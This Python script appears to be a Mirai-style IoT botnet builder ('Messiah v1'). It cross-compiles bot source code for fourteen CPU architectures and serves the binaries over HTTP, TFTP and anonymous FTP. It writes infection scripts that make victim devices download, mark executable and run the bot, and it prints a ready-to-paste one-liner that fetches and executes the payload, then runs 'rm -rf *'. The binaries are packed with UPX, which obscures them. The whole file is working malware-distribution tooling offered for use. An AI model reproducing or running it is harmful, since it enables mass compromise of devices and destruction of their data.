#Python auto cross compiler, Modified for blade

import subprocess, sys , time

if len(sys.argv) < 3:
    print("\x1b[0;33mIncorrect Usage!")
    print("\x1b[0;33mUsage: python " + sys.argv[0] + " <BOTNAME.C> <IPADDR> <PREFIX>\x1b[0m")
    sys.exit()

bot = "~/bot/*.c"
ip = sys.argv[2]
prefix = sys.argv[3]

print "\x1b[1;33mMessiah v1\x1b[31m - Big Boats - \x1b[34mCoded by heat\x1b[37m"
arch_question = raw_input("\x1b[0;33mOpen the Gates? y/n:\x1b[0m")
if arch_question.lower() == "y":
    get_arch = True
else:
    get_arch = False

time.sleep(5)
	
compileas = ["Messiah.mips", #mips
             "Messiah.mipsl", #mipsel
             "Messiah.sh4", #sh4
             "Messiah.x86", #x86
             "Messiah.arm7", #Armv7
			 "Messiah.arm6", #Armv6l
			 "Messiah.i686", #i686
			 "Messiah.powerpc", #ppc
			 "Messiah.i586", #i586
			 "Messiah.m68k", #m68k
			 "Messiah.sparc", #sparc
			 "Messiah.arm4", #' '
			 "Messiah.arm5", #apache2
			 "Messiah.440fp"] #ppc-440fp

getarch = ['http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2',
'https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2',
'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc-440fp.tar.bz2']
ccs = ["cross-compiler-mips",
       "cross-compiler-mipsel",
       "cross-compiler-sh4",
       "cross-compiler-x86_64",
	     "cross-compiler-armv7l",
       "cross-compiler-armv6l",
       "cross-compiler-i686",
       "cross-compiler-powerpc",
       "cross-compiler-i586",
       "cross-compiler-m68k",
       "cross-compiler-sparc",
       "cross-compiler-armv4l",
       "cross-compiler-armv5l",
       "cross-compiler-440fp"]
       

def run(cmd):
    subprocess.call(cmd, shell=True)

run("rm -rf /var/www/html/* /var/lib/tftpboot/* /var/ftp/*")

if get_arch == True:
    run("rm -rf cross-compiler-*")

    print("\x1b[0;33mDownloading Architectures!\x1b[0m")
	
    for arch in getarch:
        run("wget " + arch + " --no-check-certificate >> /dev/null")
        run("tar -xvf *tar.*")
        run("rm -rf *tar.*")

    print("\x1b[0;33mDownloaded cross compilers!\x1b[0m")

num = 0
for cc in ccs:
    arch = cc.split("-")[2]
    run("./"+cc+"/bin/"+arch+"-gcc -static -pthread -D" + arch.upper() + "_BUILD -o " + compileas[num] + " " + bot + " > /dev/null")
    run("./"+cc+"/bin/"+arch+"-strip -s " + arch.upper() + " > /dev/null")
    #ok = "./"+cc+"/bin/"+arch+"-gcc -static -pthread -D" + arch.upper() + "_BUILD -o " + compileas[num] + " " + bot + " > /dev/null"
    #run("echo '"+ok+"' >> lol.txt")
    num += 1

print("\x1b[0;33mCross Compiling Done\x1b[0m")
print("\x1b[0;33mSetting up HTTPD and TFTP\x1b[0m")

time.sleep(5)

run("yum install httpd -y")
run("service httpd start")
run("yum install xinetd tftp tftp-server -y")
run("yum install vsftpd -y")
run("service vsftpd start")

run('''echo -e "# default: off
# description: The tftp server serves files using the trivial file transfer   \
#       protocol.  The tftp protocol is often used to boot diskless           \
#       workstations, download configuration files to network-aware printers,  \
#       and to start the installation process for some operating systems.
service tftp
{
        socket_type             = dgram
        protocol                = udp
        wait                    = yes
        user                    = root
        server                  = /usr/sbin/in.tftpd
        server_args             = -s -c /var/lib/tftpboot
        disable                 = no
        per_source              = 11
        cps                     = 100 2
        flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')
run("service xinetd start")

print("\x1b[0;33mStarting xinetd!\x1b[0m")

time.sleep(5)

run('''echo -e "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart")

print("\x1b[0;33mRestarting vsftpd!\x1b[0m")

time.sleep(5)

for i in compileas:
    run("cp " + i + " /var/www/html")
    run("cp " + i + " /var/ftp")
    run("mv " + i + " /var/lib/tftpboot")

run('echo -e "#!/bin/bash" > /var/lib/tftpboot/'+prefix+'tftp1.sh')

run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/'+prefix+'tftp1.sh')

run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/'+prefix+'tftp1.sh')

run('echo -e "#!/bin/bash" > /var/lib/tftpboot/'+prefix+'tftp2.sh')

run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/'+prefix+'tftp2.sh')

run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/'+prefix+'tftp2.sh')

run('echo -e "#!/bin/bash" > /var/www/html/'+prefix+'bins.sh')

for i in compileas:
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/'+prefix+'bins.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/'+prefix+'tftp1.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/'+prefix+'tftp2.sh')

run("service xinetd restart")

print("\x1b[0;33mRestarting xinetd\x1b[0m")

time.sleep(5)

run("service httpd restart")

print("\x1b[0;33mRestarting httpd\x1b[0m")

time.sleep(5)

run('echo -e "ulimit -n 99999" >> ~/.bashrc')

print("\x1b[0;33mUnlimiting connections allowed to server\x1b[0m")

time.sleep(5)

print("Running UPX")

time.sleep(2)

run("""wget https://github.com/upx/upx/releases/download/v3.94/upx-3.94-i386_linux.tar.xz
tar -xvf *.xz
mv upx*/upx .
./upx --ultra-brute /var/www/html/bins/*
./upx --ultra-brute /var/lib/tftpboot/*
rm -rf upx*""")

print("UPX Completed Packing Your Binaries")

time.sleep(2)

run("""mv cross-compiler-armv6l /tmp
mv cross-compiler-armv5l /tmp
mv cross-compiler-armv4l /tmp
mv cross-compiler-armv7l /tmp
mv cross-compiler-i586 /tmp
mv cross-compiler-i686 /tmp
mv cross-compiler-m68k /tmp
mv cross-compiler-mips /tmp
mv cross-compiler-mipsel /tmp
mv cross-compiler-powerpc /tmp
mv cross-compiler-powerpc-440fp /tmp
mv cross-compiler-sh4 /tmp
mv cross-compiler-sparc /tmp
mv cross-compiler-x86_64 /tmp
""")

print("\x1b[0;33mCross compiling complete!\x1b[0m")
print("\x1b[0;33mYour link: wget http://" + ip + "/"+prefix+"bins.sh; chmod 777 "+prefix+"bins.sh; sh "+prefix+"bins.sh; tftp " + ip + " -c get "+prefix+"tftp1.sh; chmod 777 "+prefix+"tftp1.sh; sh "+prefix+"tftp1.sh; tftp -r "+prefix+"tftp2.sh -g " + ip + "; chmod 777 "+prefix+"tftp2.sh; sh "+prefix+"tftp2.sh; rm -rf "+prefix+"bins.sh "+prefix+"tftp1.sh "+prefix+"tftp2.sh; rm -rf *\x1b[0m")
print
exit(1)
